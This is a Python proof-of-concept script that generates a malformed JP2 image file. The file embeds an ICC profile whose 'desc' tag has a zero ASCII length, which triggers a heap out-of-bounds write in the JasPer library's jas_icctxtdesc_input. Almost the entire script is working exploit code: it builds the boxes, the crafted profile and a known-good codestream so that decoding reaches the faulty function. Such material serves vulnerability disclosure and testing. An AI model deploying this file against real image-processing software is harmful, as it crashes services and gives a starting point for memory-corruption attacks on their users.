#!/usr/bin/env python3
"""
VULN 001 - Heap OOB write in jas_icctxtdesc_input when asclen is zero
File: jasper/src/libjasper/base/jas_icc.c ~line 1108

Bug:
  txtdesc->ascdata[txtdesc->asclen - 1] = '\\0'
  When asclen == 0 (type uint_fast32_t), `0 - 1` wraps to UINT_FAST32_MAX.
  ascdata was returned by jas_malloc(0) (non-NULL on Linux/glibc).
  Writing to ascdata[UINT_FAST32_MAX] -> SIGSEGV / ASAN heap-buffer-overflow.

Call path:
  imginfo -f vuln_001.jp2
  -> jp2_decode()
  -> jpc_decode()              (codestream must succeed first)
  -> jas_iccprof_createfrombuf()
  -> jas_iccprof_load()
  -> jas_icctxtdesc_input()    (CRASH HERE)
"""

import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.jp2")


# ---------------------------------------------------------------------------
# JP2 box builder
# ---------------------------------------------------------------------------
def box(type4b, payload):
    """Build a JP2 box with explicit 4-byte BE length."""
    assert len(type4b) == 4
    total = 8 + len(payload)
    return struct.pack(">I", total) + type4b + payload


# ---------------------------------------------------------------------------
# ICC profile
# ---------------------------------------------------------------------------
def build_icc_profile():
    """
    Minimal ICC profile with one 'desc' tag whose asclen field is 0.

    Offset layout (all sizes in bytes):
      [  0 ..127] ICC header (128 B)
      [128 ..131] tag count = 1 (4 B)
      [132 ..143] tag table entry: sig, offset, size (12 B)
      [144 ..233] tag data (90 B):
                    [144..147] type_sig = 'desc'   (4 B)
                    [148..151] reserved = 0         (4 B)
                    [152..155] asclen = 0            (4 B)  <-- BUG TRIGGER
                    [156..159] uclangcode = 0        (4 B)
                    [160..163] uclen = 0             (4 B)
                    [164..165] sccode = 0            (2 B)
                    [166]      maclen = 0            (1 B)
                    [167..233] macdata = 0*67        (67 B)
    Total: 234 bytes
    """

    PROFILE_SIZE = 128 + 4 + 12 + 90  # 234

    # --- ICC header (128 bytes) ---
    # Fields: size, cmmtype, version, class, colorspace, PCS
    hdr  = struct.pack(">I", PROFILE_SIZE)      # 0-3:   profile size
    hdr += struct.pack(">I", 0x00000000)        # 4-7:   preferred CMM (none)
    hdr += struct.pack(">I", 0x02100000)        # 8-11:  ICC version 2.1.0
    hdr += struct.pack(">I", 0x6D6E7472)        # 12-15: class 'mntr'
    hdr += struct.pack(">I", 0x52474220)        # 16-19: colorspace 'RGB '
    hdr += struct.pack(">I", 0x58595A20)        # 20-23: PCS 'XYZ '
    # date/time: year month day hour min sec (2B each = 12B)
    hdr += struct.pack(">HHHHHH", 2024, 1, 1, 0, 0, 0)
    hdr += struct.pack(">I", 0x61637370)        # 36-39: signature 'acsp'
    hdr += struct.pack(">I", 0x00000000)        # 40-43: platform
    hdr += struct.pack(">I", 0x00000000)        # 44-47: flags
    hdr += struct.pack(">I", 0x00000000)        # 48-51: device mfr
    hdr += struct.pack(">I", 0x00000000)        # 52-55: device model
    hdr += struct.pack(">Q", 0)                 # 56-63: attributes (8B)
    hdr += struct.pack(">I", 0)                 # 64-67: rendering intent
    # PCS illuminant XYZ in s15.16 fixed-point (D50 white point)
    hdr += struct.pack(">iii",
                       0x0000F6D6,              # 68-71: X = 0.96420
                       0x00010000,              # 72-75: Y = 1.00000
                       0x0000D32D)              # 76-79: Z = 0.82491
    hdr += struct.pack(">I", 0)                 # 80-83: creator
    hdr += b'\x00' * 44                         # 84-127: profile ID + reserved
    assert len(hdr) == 128

    # --- Tag count (4 B) ---
    tag_count = struct.pack(">I", 1)

    # --- Tag table entry (12 B) ---
    TAG_SIG  = 0x64657363              # 'desc'
    TAG_OFF  = 128 + 4 + 12           # = 144 (immediately after tag table)
    TAG_SIZE = 90
    tag_table = struct.pack(">III", TAG_SIG, TAG_OFF, TAG_SIZE)

    # --- Tag data (90 B) ---
    # The loader (jas_iccprof_load) reads type_sig (4B) + reserved (4B) = 8B
    # before calling jas_icctxtdesc_input(attrval, in, cnt=TAG_SIZE-8=82).
    # jas_icctxtdesc_input then reads:
    #   asclen(4B) = 0          <-- BUG: ascdata[0-1] = '\0' -> OOB write
    #   ascdata(0B)
    #   uclangcode(4B)
    #   uclen(4B)
    #   ucdata(0B)
    #   sccode(2B)
    #   maclen(1B)
    #   macdata(67B)
    # Total content: 4+0+4+4+0+2+1+67 = 82 = cnt ✓
    tag_data  = struct.pack(">II", TAG_SIG, 0)  # type_sig + reserved (8B)
    tag_data += struct.pack(">I", 0)             # asclen = 0  <-- BUG TRIGGER
    # ascdata: 0 bytes (asclen == 0)
    tag_data += struct.pack(">I", 0)             # uclangcode
    tag_data += struct.pack(">I", 0)             # uclen = 0
    # ucdata: 0 bytes (uclen == 0)
    tag_data += struct.pack(">H", 0)             # sccode (2B)
    tag_data += struct.pack(">B", 0)             # maclen (1B)
    tag_data += b'\x00' * 67                     # macdata (67B)
    assert len(tag_data) == 90, f"tag_data length: {len(tag_data)}"

    icc = hdr + tag_count + tag_table + tag_data
    assert len(icc) == PROFILE_SIZE, f"ICC profile length: {len(icc)}"
    return icc


# ---------------------------------------------------------------------------
# Known-good JPEG 2000 codestream (32x32, 2-component).
# Extracted verbatim from jasper/data/test/good/109-PoC.jp2 bytes [129:357].
# jpc_decode() must succeed BEFORE the ICC profile is processed.
# ---------------------------------------------------------------------------
CODESTREAM_BYTES = bytes.fromhex(
    "ff4fff51002c000000000020000000200000000000000000"
    "000000200000002000000000000000000002070101030101"
    "ff52000c00000001000504040001"
    "ff5c001320485050585050585050585050504848"
    "50ff64001100014b616b6164752d76352e322e31"
    "ff90000a00000000007c0001"
    "ff93c7d4040198c7d4040850a7e00406f3cfc008"
    "043da3ed04000c17c983c7da06000d0211a1f502"
    "8000cfd55d30c3ea0600221a0862fe7aa0f9c480"
    "3e62a2ad886db1e167c1f38b0036a199ae63a335"
    "68ebc4d2a0f904009d96a901042b10d8c1f20c00"
    "5fa7c788a00db060e8067de3ffd9"
)


# ---------------------------------------------------------------------------
# JP2 file assembly
# ---------------------------------------------------------------------------
def build_jp2():
    # 1. JP2 signature box
    jp_sig = box(b"jP  ", struct.pack(">I", 0x0D0A870A))

    # 2. File type box
    ftyp_payload = b"jp2 " + struct.pack(">I", 0) + b"jp2 "
    ftyp = box(b"ftyp", ftyp_payload)

    # 3a. ihdr sub-box (matches the codestream: 32x32, 2 components)
    #   bpc=0xff (variable), comptype=7 (JP2_IHDR_COMPTYPE), unk=1, ip=0
    ihdr_payload = struct.pack(">IIHBBBB",
                               32,    # height
                               32,    # width
                               2,     # ncomp
                               0xff,  # bpc (variable per component)
                               7,     # comptype = JP2_IHDR_COMPTYPE (required)
                               1,     # unk
                               0)     # ip
    ihdr = box(b"ihdr", ihdr_payload)

    # 3b. colr sub-box: method=2 (JP2_COLR_ICC), with malformed ICC profile
    icc_data = build_icc_profile()
    colr_payload = struct.pack("BBB", 2, 0, 0) + icc_data
    colr = box(b"colr", colr_payload)

    # 3. JP2 header super-box
    # JP2H is a super-box: its length covers its children.
    # The decoder reads sub-boxes sequentially from the stream.
    jp2h = box(b"jp2h", ihdr + colr)

    # 4. JP2C codestream box (explicit length)
    jp2c_len = 8 + len(CODESTREAM_BYTES)
    jp2c = struct.pack(">I", jp2c_len) + b"jp2c" + CODESTREAM_BYTES

    return jp_sig + ftyp + jp2h + jp2c


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    jp2_data = build_jp2()
    with open(OUT_FILE, "wb") as f:
        f.write(jp2_data)
    print(f"[+] Written {len(jp2_data)} bytes to {OUT_FILE}")

    # Sanity checks
    icc = build_icc_profile()
    asclen_offset = 128 + 4 + 12 + 8  # = 152 within ICC data
    asclen = struct.unpack(">I", icc[asclen_offset:asclen_offset + 4])[0]
    print(f"[+] ICC profile: {len(icc)} bytes")
    print(f"[+] 'desc' tag asclen = {asclen} (must be 0 to trigger bug)")
    print(f"[+] Codestream: {len(CODESTREAM_BYTES)} bytes (for jpc_decode)")
    print(f"[+] Expected crash: ascdata[0 - 1] = ascdata[UINT_FAST32_MAX] -> OOB write")
